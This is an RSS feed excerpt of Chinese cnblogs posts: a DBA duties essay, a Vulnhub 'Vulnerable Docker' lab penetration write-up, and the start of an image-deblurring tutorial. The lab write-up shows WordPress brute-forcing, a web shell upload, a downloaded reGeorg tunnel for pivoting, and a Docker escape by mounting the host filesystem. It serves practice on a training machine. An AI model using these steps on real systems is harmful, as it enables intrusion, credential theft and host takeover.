<guid isPermaLink="true" >http://www.cnblogs.com/youcong/p/9735738.html</guid>
<description>&lt;p&gt;数据库管理员(Database Administrator，简称DBA)，是从事管理和维护数据库管理系统(DBMS)的相关工作人员的统称，他属于运维工程师的一个分支，主要负责业务数据库从设计、测试到部署交付的全生命周期管理。&lt;/p&gt;
&lt;p&gt;在大公司DBA通常分为高级DBA、中级DBA、初级DBA，他们的职责是不同的。&lt;/p&gt;
&lt;p&gt;高级DBA:他们能够熟练阅读数据库方面的英文资料，并且都熟悉很多种操作平台下的几种大型数据库。他们知道各种不同数据库在不同环境下的优势和劣势，并能在数据库平台和数据库环境的选择方面做出决策。他们一般通晓系统架构和数据库设计，并能对数据库进行各种级别的优化。高级DBA一般都配有助手，他们更偏向做决策和计划。高级DBA往往在银行业、保险业、在线交易等对稳定性、安全性、性能都要求比较高的关键业务处理领域大显身手。&lt;/p&gt;

&lt;p&gt;中级DBA:从业一年左右，熟悉某种操作系统环境下的数据库,比如window server 2008或者目前常用的Linux（Ubuntu、Debian、CentOS）。因为对中级DBA来讲，Windows NT和Unix是有很大差别的。中级DBA对SQL比较熟悉，他们自己购买了几本数据库方面的书籍，并深入钻研。中级DBA往往同时兼任数据库程序员，他们的工作对性能、稳定性、安全性的追求基本上不是很高，往往配合高级DBA做一些例行工作。&lt;/p&gt;

&lt;p&gt;初级DBA:&lt;/p&gt;
&lt;p&gt;初级DBA又称为DBBS，是英文Database Baby Sitter的缩写。初级DBA常常是兼职的，他们往往同时是程序员或者兼任其他的工作。初级DBA往往参与了很多和数据库有关的项目或工作。但是，这些项目或者工作往往是：第三方软件供应商已经安装并配置了数据库，他们只做一些监控的工作。他们能处理一些简单的问题，但大多数时候他们向应用软件供应商求救。初级DBA更喜欢图形化的数据库管理或者监控工具，他们喜欢Access这样的桌面数据库简单易用，并把这些小型数据库的经验简单地应用到大型数据库相关的工作中。&lt;/p&gt;
&lt;p&gt;初级DBA是最好区分的。而中级DBA和高级DBA就不太好区分。他们的差别在于经验的不同和个性特点、能力方面的差异。中级DBA比较多，他们可以胜任高级DBA的大部分工作，包括：&lt;/p&gt;
&lt;p&gt;1、数据库安装；&lt;/p&gt;
&lt;p&gt;2、数据库配置和管理；&lt;/p&gt;
&lt;p&gt;3、权限设置和安全管理；&lt;/p&gt;
&lt;p&gt;4、监控和性能调节；&lt;/p&gt;
&lt;p&gt;5、备份和恢复；&lt;/p&gt;
&lt;p&gt;6、解决一般的问题；&lt;/p&gt;

&lt;p&gt;今天我主要说说我公司的DBA。我所在的公司是一个初创型公司，自创建到现在已经有一年了，我并不是公司的第一批员工。初创公司的好处是最锻炼人，最能成长一个人。但是弊端也不少以下我从这么几个方面谈谈初创公司的弊端?&lt;/p&gt;
&lt;p&gt;(1)升职加薪没有一个完善的制度，完全是由所在部门的经理或者其他高层人士拍板决定,很长时间可能会停留在固定的薪资而不变;&lt;/p&gt;
&lt;p&gt;(2)没有公积金，初创公司一般资金有限能最大程度减少成本就减少成本(当然了，也不排除有部分公司会有，但是就我目前认识的朋友中，有好几个在创业公司，基本上是没有公积金的，有的是等两年到三年相关的有稳定的收入，然后才给员工公积金;&lt;/p&gt;
&lt;p&gt;(3)初创公司没有固定的收入来源，除了老板注入的资金外，基本就没有了，除了中途来一个投资人，注入资金，不然很长一段时间是由老板自己垫付工资及其五险等等;&lt;/p&gt;
&lt;p&gt;(4)解雇的风险，一般情况下，初创公司很少会跟员工签合同，签合同是一件很麻烦的事情，不签合同可以适当降低风险;&lt;/p&gt;
&lt;p&gt;(5)开发流程不是非常合理和人员调配不是十分合理，往往一人兼任多个岗位，一旦沟通方面有问题，可能使项目开发进度延迟;&lt;/p&gt;
&lt;p&gt;(6)加班是没有工资的(不单单是初创公司，很多中小型公司都是这样的);&lt;/p&gt;
&lt;p&gt;不过好的方面也是十分突出的，这里就说一点，那就是对于个人的各方面能力提升是非常有帮助的，比如就我个人，从开发到运维，再到测试，再到DBA。有的时候还得兼任下产品宣传工作。有时还得出差调调设备之类的。不光光锻炼一个人的学习能力，同时锻炼一个人的沟通能力及其心理素质抗压能力等。&lt;/p&gt;

&lt;p&gt;下面进入正题:&lt;/p&gt;
&lt;p&gt;作为一名DBA以现在我所在的公司为例，我打算应该统一下规范，而不是各打各的想怎么改就怎么改。想怎么改就怎么改的痛苦我已经体会过一次了，不想再体会了。&lt;/p&gt;
&lt;p&gt;以下是我的想法和将要实践的:&lt;/p&gt;
&lt;p&gt;作为一名DBA，他的职责应该要做到这些:&lt;/p&gt;
&lt;p&gt;(1)安装和升级数据库服务器，以及应用程序工具;&lt;/p&gt;
&lt;p&gt;(2)数据库设计系统存储方案，并制定未来的存储需求计划;&lt;/p&gt;
&lt;p&gt;(3)一旦开发人员设计了一个应用，就需要DBA来创建数据库存储结构，创建数据库对象;&lt;/p&gt;
&lt;p&gt;(4)根据开发人员的反馈信息，必要的时候，修改数据库的结构;&lt;br/&gt;(5)登记数据库的用户，维护数据库的安全性&lt;/p&gt;
&lt;p&gt;(6)控制和监控用户对数据库的存取访问;&lt;/p&gt;
&lt;p&gt;(7)监控和优化数据库的性能;&lt;/p&gt;
&lt;p&gt;(8)保证数据库的使用符合知识产权相关法规;&lt;/p&gt;
&lt;p&gt;(9)维护适当介质上的存档或者备份数据;&lt;/p&gt;
&lt;p&gt;(10)制定数据库备份计划，灾难出现时对数据库信息进行恢复;&lt;/p&gt;
&lt;p&gt;针对上述说的我进行细化:&lt;/p&gt;
&lt;p&gt;针对(1),主要考虑数据库更新升级，性能上的提升或者是bug修补，作为dba需要关注数据库技术前沿,目前应用比较广的是MySQL，例如阿里的淘宝使用的就是MySQL。&lt;br/&gt;关于安装或升级可参考例子:https://www.cnblogs.com/sunofsummer/p/6381206.html。&lt;/p&gt;
&lt;p&gt;针对(2),本着业务可扩展性原则，作为DBA必须要熟悉整个业务架构和业务逻辑，以CSDN为例，最初的CSDN是没有多样性的功能，例如学院、招聘等等。而且就是没有广大的用户群体，当用户群体增长到一定的程度时，由一百万到一千万时，数据库的设计尤其重要，不仅仅需要主从复制，以保证数据的一致性，还得分库分表。&lt;/p&gt;
&lt;p&gt;针对(3),很多小公司是没有DBA的，一般情况由开发组长进行表的设计，同时其组员也可以参与设计甚至自主设计。这样存在一个重大的弊端是，当人数过多时，你改这个字段，我改那个字段，你新增这个表，我新增或者删除另外一个表，当业务愈发复杂，同时表之间关系耦合性强，那么对于整个系统而言是一次毁灭性的打击。最理想的状态是，开发人员与业务人员沟通好，并编写一个业务需求设计文档和表设计文档，然后由DBA进行审核，DBA有时需要同业务人员及开发人员沟通。&lt;/p&gt;
&lt;p&gt;针对(4)需求变动是常有的事情，需求变动通常伴随着代码的修改，代码的修改一般涉及实体、接口、sql（这里以ssm框架实现的项目为例)。实体对应表结构，接口对应着业务逻辑，sql是操作数据库的专用语言。&lt;/p&gt;
&lt;p&gt;针对(5),数据库的安全性尤其重要至关重要，前段时间的华住就是一个例子。一般连接数据库有这么几个要素?&lt;br/&gt;a.建立连接：&lt;br/&gt;b.加载驱动;&lt;br/&gt;c.操作数据库的用户和密码;&lt;br/&gt;一般情况下，查看访问数据库用户，可通过show processlist命令查看 如果有未知的用户和IP访问，这时就必须引起重视了。&lt;/p&gt;

&lt;p&gt;针对(6),最近的顺丰某位程序员不小心删库，主要原因在于该程序员，根本原因在于制度上的不完善。作为DBA，特别是高级DBA必须要控制用户操作权限。&lt;/p&gt;
&lt;p&gt;针对(7),实时监控的工具有zabbix和nagios，监控的目的是为了确保mysql运行是否是正常的。同时也是为了修改配置优化I/O，有一个实时监控作为一个衡量标准，比较优化前后是怎么样的。&lt;/p&gt;
&lt;p&gt;针对(8),相关的知识产权法律还是要懂的，不懂法是一件很可怕的事情,所以这里要强调一下，程序员还是得多多了解一下法律，之所以强调是因为程序员大多比较老实本分，性格比较内向，但是往往也是容易被罪恶伤害的一方，比如之前WePhone创始人被逼自杀。所以说前车之鉴在此，IT的小伙伴们要多多注意。&lt;/p&gt;
&lt;p&gt;针对(9),维护适当介质上的存档或者备份数据,这里要说一下，适当的存档分门别类为的是，以后如果查找起来或者是恢复起来有一个依据和标准,特别是备份，万一因为某某不慎操作导致数据丢失，如果没有实时备份的话，那么就挺坑爹的。作为DBA，其数据备份和恢复是必要的手段。&lt;/p&gt;
&lt;p&gt;针对(10),其实和(9)的道理是一样的。&lt;/p&gt;
&lt;p&gt;作为DBA的核心目标:保证数据库管理系统的稳定性、安全性、完整性和高性能。&lt;/p&gt;

&lt;p&gt;另外稍微说一下,&lt;br/&gt;数据库开发工程师与数据库管理员的区别，区别如下所示:&lt;/p&gt;
&lt;p&gt;(1)数据库开发工程师的主要职责是设计和开发数据库管理系统和数据库应用软件系统，侧重于软件研发;&lt;/p&gt;
&lt;p&gt;(2)DBA的主要职责是运维和管理数据库管理系统，侧重于运维管理;&lt;/p&gt;

&lt;p&gt;小结:&lt;/p&gt;
&lt;p&gt;今天主要侧重点在于DBA的职责和目标，DBA同运维也一样，有些时候还是很容易沦为专业背锅户的。接下来我将会侧重写怎么做会更好。&lt;/p&gt;
&lt;p&gt;我目前用的比较多的是MySQL。我的很多朋友，他们的公司也是用MySQL。MySQL博大精深，在此推荐一本书《高性能MySQL》。这本书是MySQL的创始团队写的，很不错很好，不过阅读起来可能会有一定的难度，专业DBA手头必需书，同时也是全栈工程师手头必备书。建议有使用MySQL开发一年以上的大中型应用的朋友们，都可以看看。我相信你们看到这本书一定会有不少的启发的。&lt;/p&gt;

</description>
<pubDate>Mon, 01 Oct 2018 13:12:00 +0000</pubDate>
<dc:creator>挑战者V</dc:creator>
<og:description>数据库管理员(Database Administrator，简称DBA)，是从事管理和维护数据库管理系统(DBMS)的相关工作人员的统称，他属于运维工程师的一个分支，主要负责业务数据库从设计、测试到部</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/youcong/p/9735738.html</dc:identifier>
</item>
<item>
<title>记一次对Vulnerable Docker靶机渗透全过程 - 落花四月</title>
<link>http://www.cnblogs.com/lxz-1263030049/p/9735611.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lxz-1263030049/p/9735611.html</guid>
<description>&lt;h2 id=&quot;记一次对vulnerable-docker靶机渗透全过程&quot;&gt;记一次对Vulnerable Docker靶机渗透全过程&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Vulnhub&lt;/code&gt;它是一个提供各种漏洞环境的平台，里面大部分的环境是要用&lt;code&gt;VMware&lt;/code&gt;或者&lt;code&gt;VirtualBox&lt;/code&gt;打开运行的。&lt;/p&gt;
&lt;p&gt;今天我主要是使用&lt;code&gt;VMware&lt;/code&gt;搭建一个&lt;code&gt;Vulnerable Docker&lt;/code&gt;靶机环境，主要是为了练习使用。&lt;/p&gt;
&lt;p&gt;完整找出所有&lt;code&gt;flag&lt;/code&gt;只是基本任务，实现提权才是终极目标。我并不追求最快夺旗，而是尽可能运用所学的知识完整的运用在这套靶机中，所以，&lt;/p&gt;
&lt;p&gt;这篇文章中，或许某些内容对拿到&lt;code&gt;flag&lt;/code&gt;无直接帮助，但在应对真实目标时，还是有一点帮助的。&lt;/p&gt;
&lt;h3 id=&quot;x01vulnerable-docker靶机下载&quot;&gt;0x01:Vulnerable Docker靶机下载&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com&quot; class=&quot;uri&quot;&gt;https://www.vulnhub.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;里面有各种各样的镜像，可以下载到自己的机子上面练习。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/VNKLqoP.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;(需要我们注意的是，下载靶机环境的时候，我们需要提前看清这个靶机环境是否支持&lt;code&gt;VMware&lt;/code&gt;的安装，否则就不可以安装在&lt;code&gt;VWMare&lt;/code&gt;上面)&lt;/p&gt;
&lt;p&gt;今天我们选择的是使用&lt;code&gt;Vulnerable Docker: 1&lt;/code&gt;靶机环境&lt;/p&gt;
&lt;p&gt;首先：这个靶机环境支持&lt;code&gt;VMware&lt;/code&gt;环境的安装。&lt;/p&gt;
&lt;p&gt;其次：靶机环境比较简单(&lt;code&gt;flag&lt;/code&gt;只有三个)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/sEkxD1v.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;靶机下载地址：&lt;code&gt;Download&lt;/code&gt;：&lt;a href=&quot;https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova&quot; class=&quot;uri&quot;&gt;https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;x02vulnerable-docker靶机安装&quot;&gt;0x02:Vulnerable Docker靶机安装&lt;/h3&gt;
&lt;p&gt;下载完成之后就会看见有&lt;code&gt;ova&lt;/code&gt;格式的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/USt4UH2.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;双击导入&lt;code&gt;VMware&lt;/code&gt;中就可以了（具体操作过程）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QP8RptF.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击下一步：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ktp0iXd.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后等待导入完成，导入速度看本机性能和镜像的大小&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/qJMn3yX.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再对靶机环境进行配置一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/4CuBndW.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;启动&lt;code&gt;Vulnerable Docker&lt;/code&gt;靶机就可以看见&lt;/p&gt;
&lt;h3 id=&quot;x03完成任务&quot;&gt;0x03:完成任务！&lt;/h3&gt;
&lt;p&gt;作者给我们的描述是：这里里面有三个&lt;code&gt;flag&lt;/code&gt;(其中的&lt;code&gt;flag_2&lt;/code&gt;被发行者无意中遗漏了)&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;We have planted 3 flag files across the various machines / systems that are available to you&lt;/p&gt;
&lt;p&gt;Your mission if you choose to accept would be as following:&lt;/p&gt;
&lt;p&gt;Identify all the flags (2 in total: flag_1 and flag_3) (flag_2 was inadvertently left out)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;网络扫描&quot;&gt;1:网络扫描&lt;/h4&gt;
&lt;p&gt;启动&lt;code&gt;Vulnerable Docker&lt;/code&gt;靶机就可以看见：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/m1kW9Kk.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;nmap&lt;/code&gt;对靶机&lt;code&gt;IP&lt;/code&gt;地址进行扫描：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nmap -A 192.168.232.134&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/3m3tFqt.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;flag_1&quot;&gt;2：flag_1&lt;/h4&gt;
&lt;p&gt;我们先打开&lt;code&gt;8000&lt;/code&gt;端口，看看有没有&lt;code&gt;flag&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/f039gkV.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;WPscan&lt;/code&gt;进行漏洞扫描：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;wpscan --url http://192.168.232.134:8000/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mWHN7yu.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开链接：&lt;a href=&quot;http://192.168.232.134:8000/robots.txt&quot; class=&quot;uri&quot;&gt;http://192.168.232.134:8000/robots.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UkEm5eA.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;WPscan&lt;/code&gt;进行枚举用户名：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;wpscan --url http://192.168.232.134:8000/ --enumerate u&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/fdxps0Y.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按照正常思维对用户名进行爆破：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;wpscan --url http://192.168.232.134:8000/ -e u --wordlist /root/桌面/1.txt&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hoO2xU7.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;并没有爆破得到任何信息(QAQ)：&lt;/p&gt;
&lt;p&gt;这个时候需要我们再回头开始看起，看见一个链接，&lt;code&gt;wordpress&lt;/code&gt;的登录端口：&lt;a href=&quot;http://192.168.232.134:8000/wp-admin/&quot; class=&quot;uri&quot;&gt;http://192.168.232.134:8000/wp-admin/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/t88NjmE.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用刚刚爆破出来的用户名&lt;code&gt;bob&lt;/code&gt;填进去就可以了，而在这里的密码需要使用&lt;code&gt;burp&lt;/code&gt;进行爆破(具体操作过程)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cuA4bCK.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6SFWoqf.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;爆破得到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/g3T2LER.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;成功登录后台(经过一系列的乱翻之后就会找到）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/JaQ9QzY.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;flag_3&quot;&gt;3：flag_3&lt;/h4&gt;
&lt;p&gt;这下面的操作是在我的另一个&lt;code&gt;kali&lt;/code&gt;中的操作（具体原因下文会提到)&lt;/p&gt;
&lt;p&gt;如果可以进入&lt;code&gt;Wordpress&lt;/code&gt;的后台，那么拿&lt;code&gt;shell&lt;/code&gt;就很简单了，使用在线编辑功能就可以。&lt;/p&gt;
&lt;p&gt;使用菜刀上传一句话(&lt;code&gt;php&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Ywh9r18.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;连上&lt;code&gt;shell&lt;/code&gt;后收集了下面的一些信息&lt;/p&gt;
&lt;p&gt;数据库中的信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'WordPressISBest');
define('DB_HOST', 'db:3306');&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;系统是 &lt;code&gt;Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux&lt;/code&gt;，用户是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;www-data&lt;/code&gt;，这么新的系统直接就可以放弃提权了，否则&lt;code&gt;Dirty COW&lt;/code&gt;之类的洞还是超级好用的，不过我们可以参考下面这一篇文章，找到一点灵感&lt;/p&gt;
&lt;p&gt;可以参考&lt;code&gt;Tunnel Manager - From RCE to Docker Escape&lt;/code&gt;：&lt;a href=&quot;https://paper.seebug.org/396/&quot; class=&quot;uri&quot;&gt;https://paper.seebug.org/396/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/rIpidsq.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ip addr&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
   valid_lft forever preferred_lft forever
5: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default 
link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
inet 172.18.0.2/16 scope global eth0
   valid_lft forever preferred_lft forever&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2ejNS3o.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;想起题目是&lt;code&gt;Vulnerable Docker VM&lt;/code&gt;，猜想应该就是&lt;code&gt;docker.sock&lt;/code&gt;或者&lt;code&gt;HTTP API&lt;/code&gt;未授权访问之类的问题，不过翻了下没找到什么。&lt;/p&gt;
&lt;p&gt;但是看机器的&lt;code&gt;IP&lt;/code&gt;，感觉这个虚拟机里面应该还有个&lt;code&gt;docker network&lt;/code&gt;的内网，简单的&lt;code&gt;ping&lt;/code&gt;了下，发现至少是存在&lt;code&gt;172.18.0.1-4&lt;/code&gt;的，这时候&lt;/p&gt;
&lt;p&gt;需要做一下内网穿透，这样方便在我的电脑上操作，否则&lt;code&gt;shell&lt;/code&gt;里面缺少很多工具和依赖，比较麻烦。&lt;/p&gt;
&lt;p&gt;我使用的是 &lt;code&gt;reGeorg&lt;/code&gt;：&lt;a href=&quot;https://github.com/sensepost/reGeorg&quot; class=&quot;uri&quot;&gt;https://github.com/sensepost/reGeorg&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;curl -o tunnel.php 

https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;浏览器访问了一下，显示&lt;code&gt;Georg says,'All seems fine'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本地电脑上运行&lt;code&gt;python reGeorgSocksProxy.py -u http://192.168.30.171:8000/tunnel.php&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.30.171:8000/tunnel.php]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;reGeorg&lt;/code&gt;提供的是&lt;code&gt;socks5&lt;/code&gt;代理，所以需要本地使用&lt;code&gt;proxychains&lt;/code&gt;具体配置不多说了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4&lt;/code&gt; 连接数据库，&lt;/p&gt;
&lt;p&gt;但是并没有找到什么 &lt;code&gt;flag&lt;/code&gt;，然后继续扫内网，还是&lt;code&gt;nmap&lt;/code&gt;那一堆命令加上&lt;code&gt;proxychains&lt;/code&gt;前缀就好。&lt;/p&gt;
&lt;p&gt;然后发现一个&lt;code&gt;IP&lt;/code&gt;有个奇怪的端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Nmap scan report for 172.18.0.3
Host is up (0.0062s latency).
Not shown: 998 closed ports
PORT STATE SERVICE
22/tcp   open  ssh
8022/tcp open  oa-system&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;curl&lt;/code&gt;看了下，貌似是一个网页，然后在设置了浏览器的&lt;code&gt;socks5&lt;/code&gt;代理，就看到了，原来是一个网页版&lt;code&gt;ssh&lt;/code&gt;，而且这里面终于有&lt;code&gt;docker.sock&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hJcX1uN.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来就是老套路了，可以参考 ：&lt;strong&gt;Docker学习与remote API未授权访问分析和利用&lt;/strong&gt;：&lt;a href=&quot;https://www.secpulse.com/archives/55928.html&quot; class=&quot;uri&quot;&gt;https://www.secpulse.com/archives/55928.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而我是直接在另一个&lt;code&gt;kali&lt;/code&gt;中里面安装了一个&lt;code&gt;docker&lt;/code&gt;，这样就可以操作主机上的&lt;code&gt;docker&lt;/code&gt;了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/sD8emwD.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后使用&lt;code&gt;volume&lt;/code&gt;挂载主机上的所有文件到一个目录&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;docker run -it --rm -v /:/vol wordpress /bin/bash&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样就可以看到&lt;code&gt;flag_3&lt;/code&gt;了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jqnrfR5.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;关于这一个靶机漏洞可以学习到很多知识&lt;/p&gt;
&lt;p&gt;首先：关于&lt;code&gt;wordpress&lt;/code&gt;漏洞&lt;/p&gt;
&lt;p&gt;其次：提权中遇到的关于&lt;code&gt;Tunnel Manager - From RCE to Docker Escape&lt;/code&gt;漏洞&lt;/p&gt;
&lt;p&gt;最后：关于&lt;code&gt;Docker&lt;/code&gt;的自学以及&lt;code&gt;Docker&lt;/code&gt;学习与&lt;code&gt;remote API&lt;/code&gt;未授权访问分析和利用&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable Docker靶机下载&lt;/strong&gt;：&lt;a href=&quot;https://www.vulnhub.com/entry/vulnerable-docker-1,208/&quot; class=&quot;uri&quot;&gt;https://www.vulnhub.com/entry/vulnerable-docker-1,208/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker学习与remote API未授权访问分析和利用&lt;/strong&gt;：&lt;a href=&quot;https://www.secpulse.com/archives/55928.html&quot; class=&quot;uri&quot;&gt;https://www.secpulse.com/archives/55928.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WPScan使用完整教程之记一次对WordPress的渗透过程：&lt;/strong&gt; &lt;a href=&quot;https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;amp;tid=46194&amp;amp;page=1#pid511454&quot; class=&quot;uri&quot;&gt;https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;amp;tid=46194&amp;amp;page=1#pid511454&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker学习&lt;/strong&gt;：&lt;a href=&quot;https://www.bilibili.com/video/av17854410?from=search&amp;amp;seid=13990341548063716463&quot; class=&quot;uri&quot;&gt;https://www.bilibili.com/video/av17854410?from=search&amp;amp;seid=13990341548063716463&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tunnel Manager - From RCE to Docker Escape&lt;/strong&gt;：&lt;a href=&quot;https://paper.seebug.org/396/&quot; class=&quot;uri&quot;&gt;https://paper.seebug.org/396/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;reGeorg&lt;/strong&gt;：&lt;a href=&quot;https://github.com/sensepost/reGeorg&quot; class=&quot;uri&quot;&gt;https://github.com/sensepost/reGeorg&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 12:23:00 +0000</pubDate>
<dc:creator>落花四月</dc:creator>
<og:description>记一次对Vulnerable Docker靶机渗透全过程 它是一个提供各种漏洞环境的平台，里面大部分的环境是要用 或者 打开运行的。 今天我主要是使用 搭建一个 靶机环境，主要是为了练习使用。 完整找</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lxz-1263030049/p/9735611.html</dc:identifier>
</item>
<item>
<title>图像去模糊算法 循序渐进 附完整代码 - cpuimage</title>
<link>http://www.cnblogs.com/cpuimage/p/9735150.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cpuimage/p/9735150.html</guid>
<description>&lt;p&gt;关于图像模糊算法的实现，&lt;/p&gt;
&lt;p&gt;我相信大多数学习图像算法的朋友都很熟悉。&lt;/p&gt;
&lt;p&gt;例如常见的毛玻璃效果，高斯模糊等等。&lt;/p&gt;
&lt;p&gt;而图像模糊最简单的实现就是 在一定区域 对像素做平均值计算。&lt;/p&gt;
&lt;p&gt;术语描述，卷积。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.认识卷积&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而平均值计算可以，是一种常见的卷积计算，卷积核权重都为1。&lt;/p&gt;
&lt;p&gt;OpenCV中与之对应的算法是BoxBlur。&lt;/p&gt;
&lt;p&gt;图像方面深度学习中最重要的两个层，一个池化层，一个卷积层，&lt;/p&gt;
&lt;p&gt;其中池化层可以认为是一种特例的卷积层，与求平均值类似。&lt;/p&gt;
&lt;p&gt;从网上找了一张卷积操作的示例图片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/824862/201810/824862-20181001170853050-1594052480.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
